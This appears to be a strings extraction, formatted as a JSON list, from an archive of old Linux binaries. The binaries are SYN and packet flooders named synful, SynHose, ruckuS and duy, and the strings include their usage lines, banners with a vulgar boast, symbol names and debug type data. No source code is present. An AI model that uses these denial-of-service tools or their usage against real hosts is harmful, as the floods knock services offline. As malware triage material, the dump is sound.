            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/synful",
            "0100755",
            "0000000",
            "0000000",
            "00000035037",
            "07100656704",
            "013413",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "bcopy",
            "gettimeofday",
            "srand",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u010d",
            "QVhp",
            "UHfEP",
            "fE\u0583}",
            "1fEPh{",
            "E;Er",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "UiEE",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "U*EE",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "}fUf",
            "fUm]\u030bEm\u0289BfU\u0503EPEPEPEPh",
            "EPo 1fEPEP1fEPE",
            "E1fEP1fEPEPEP",
            "fEfUeM",
            "fE\u058bEfEfE",
            "EEfE1fEPx",
            "fE1fEEE",
            "MPeM",
            "eeee\u07c0e?h",
            "fEfE",
            "EfEEEh",
            "fEfEEfE",
            "fE\u078bEEEEE",
            "RE\u050dP",
            "j EPD",
            "EPUPj",
            "j(EPEPz EP+",
            "S1\u0483}",
            "]1fE",
            "\u0403;u[]",
            "synful [It's so synful to send those spoofed SYN's]",
            "Hacked out by \\\\StOrM\\\\",
            "syntax: synful targetIP",
            "Destination  : %s",
            "Port         : %u",
            "NumberOfTimes: %d",
            "%d.%d.%d.%d",
            "Being Synful to %s at port %u from %s port %u",
            "@socket",
            "cant find %s!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "synful.c",
            "i.45",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "dosynpacket",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "initrand",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "host2ip",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gettimeofday@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/synhose",
            "0100755",
            "0000000",
            "0000000",
            "00000035100",
            "07100656706",
            "013554",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "bcopy",
            "gettimeofday",
            "srand",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u010d",
            "QVhp",
            "UHfEP",
            "fE\u0583}",
            "1fEPh",
            "E;Er",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "UiEE",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "U*EE",
            "}fUf",
            "fUm]\u030bEm\u028dP",
            "}fUf",
            "fUm]\u030bEm\u0289BfU\u0503EPEPEPEPh",
            "EPo 1fEPEP1fEPE",
            "E1fEP1fEPEPEP",
            "fEfUeM",
            "fE\u058bEfEfE",
            "EEfE1fEPx",
            "fE1fEEE",
            "MPeM",
            "eeee\u07c0e?h",
            "fEfE",
            "EfEEEh",
            "fEfEEfE",
            "fE\u078bEEEEE",
            "RE\u050dP",
            "j EPD",
            "EPUPj",
            "j(EPEPz EP+",
            "S1\u0483}",
            "]1fE",
            "\u0403;u[]",
            "SynHose [A random source IP syn flooder]",
            "Written by knight / Idea by   : rza",
            "syntax: %s dsthost port num",
            "Destination  : %s",
            "Port         : %u",
            "NumberOfTimes: %d",
            "%d.%d.%d.%d",
            "SynHosing %s at port %u from %s port %u",
            "@socket",
            "cant find %s!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "synhose.c",
            "i.45",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "dosynpacket",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "initrand",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "host2ip",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gettimeofday@@GLIBC_2.0",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/ruc",
            "0100755",
            "0000000",
            "0000000",
            "00000023163",
            "06514754526",
            "012672",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.1",
            "libc.so.5",
            "printf",
            "random",
            "_DYNAMIC",
            "usleep",
            "memcpy",
            "perror",
            "system",
            "socket",
            "___brk_addr",
            "__environ",
            "_init",
            "__libc_init",
            "environ",
            "fprintf",
            "ctime",
            "__fpu_control",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "gettimeofday",
            "fopen",
            "memset",
            "fclose",
            "time",
            "gethostbyname",
            "_fini",
            "atexit",
            "_GLOBAL_OFFSET_TABLE_",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "strchr",
            "close",
            "_etext",
            "_edata",
            "__bss_start",
            "_end",
            "\u0340SX(",
            "EEEh",
            "EQh-",
            "EQh-",
            "EUEPh1",
            "UuVhp",
            "UuVh",
            "EEUR",
            "EQh-",
            "EQh-",
            "EUEPh",
            "UUuV@",
            "EURh",
            "uuEP",
            "UUuV",
            "e[^]",
            "WVSU",
            "e[^_]",
            "UHSj",
            "M@eM",
            "eeee\u07c0e?fE",
            "EEP^",
            "EfE(",
            "fE\u0421t-",
            "fEh9H7(",
            "fEfE",
            "EPEP",
            "\u0403;u[",
            "[0;1mABusage ",
            "[0m: %s <",
            "[0;36mVictim",
            "[0m> <",
            "[0;36mport.numbers",
            "[0m>",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;37m  Aborted..",
            "[0mFlooded for ",
            "[1;37m:",
            "[0m %d days %d hours %d mins %d secs",
            "[0mTotal packets sent ",
            "[1;37m:",
            "[0m %d",
            "ruckuS.log",
            "Host : %s",
            "Flooded for : %d days %d hours %d mins %d secs",
            "Packets sent : %d",
            "clear",
            "[1;36",
            "[1;30m       .",
            "[0m.",
            "[1;30m   . `",
            "[0;36mf",
            "[1;36mWC",
            "[0m ",
            "[0m' ",
            "[1;37m.",
            "[1;30m. ",
            "[0mrucku",
            "[1;37mS",
            "[1;37m.c",
            "[0m ",
            "[1;37m.",
            "[0m  known to clog even yer fat mamas twat!",
            "0.04b",
            "[1;30m`~~~Oo~",
            "[0m~~' rucku",
            "[1;37mS",
            "[0m [",
            "[1;34mv.",
            "[0;34m%s",
            "[0m]   by : _yakuza_ ",
            "       ",
            "[1;30m$$",
            "[0m  Registered to : dArkwAr",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;36m  No such Host ",
            "[0m:",
            "[1;30m %s",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;36m  Error ",
            "[0m:",
            "[1;30m Transmitting SYN Packet!",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;37m H",
            "[0most joo iz bringin' ",
            "[0mrucku",
            "[1;37mS",
            "[0m on ",
            "[1;37m:",
            "[1;36m %s",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;37m P",
            "[0mort(s) you are wreckin' ",
            "[1;37m:",
            "[1;36m %d",
            "[0m,",
            "[1;30m-",
            "[0;36mR",
            "[1;30m-",
            "[1;36m  Error ",
            "[0m: ",
            "[1;37mCould not open socket!",
            "[1;30m-",
            "[0;36mR",
            "[1;30m- ",
            "[0mUse ",
            "[1;37m^C",
            "[0m to Terminate..",
            "Flood started at : [%s]",
            "GCC: (GNU) 2.6.4 snapshot 950518",
            "GCC: (GNU) 2.7.0",
            "GCC: (GNU) 2.6.4 snapshot 950518",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            "crtstuff.c",
            "gcc2_compiled.",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "init_dummy",
            "force_to_data",
            "__DTOR_END__",
            "crt0.S",
            "done",
            "__do_global_dtors_aux",
            "__DTOR_LIST__",
            "fini_dummy",
            "__CTOR_LIST__",
            "ruckuS3.c",
            "death",
            "send_tcp_segment",
            "dstport",
            "printf",
            "random",
            "resolve_host",
            "_DYNAMIC",
            "_etext",
            "usleep",
            "memcpy",
            "strip",
            "perror",
            "system",
            "pktssnt",
            "abusage",
            "socket",
            "___brk_addr",
            "__environ",
            "_init",
            "dstnigr",
            "__libc_init",
            "environ",
            "fprintf",
            "ctime",
            "__fpu_control",
            "parsedemargs",
            "_start",
            "rand",
            "signal",
            "htonl",
            "sendto",
            "___crt_dummy__",
            "gettimeofday",
            "fopen",
            "__bss_start",
            "memset",
            "main",
            "fclose",
            "time",
            "gethostbyname",
            "_fini",
            "atexit",
            "ports",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons",
            "exit",
            "atoi",
            "__setfpucw",
            "rheader",
            "strchr",
            "close",
            "filebuf",
            "datapool/bin/duy",
            "0100755",
            "0000000",
            "0000000",
            "00000031314",
            "07100656576",
            "012675",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "socket",
            "bzero",
            "send",
            "fprintf",
            "__deregister_frame_info",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh$",
            "QVhT",
            "fU1fEPN",
            "UPEP+",
            "\u0403;u[]",
            "Unknown host: %s",
            "Packeting %s:%d",
            "Syntax: %s host any_open_port",
            "1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
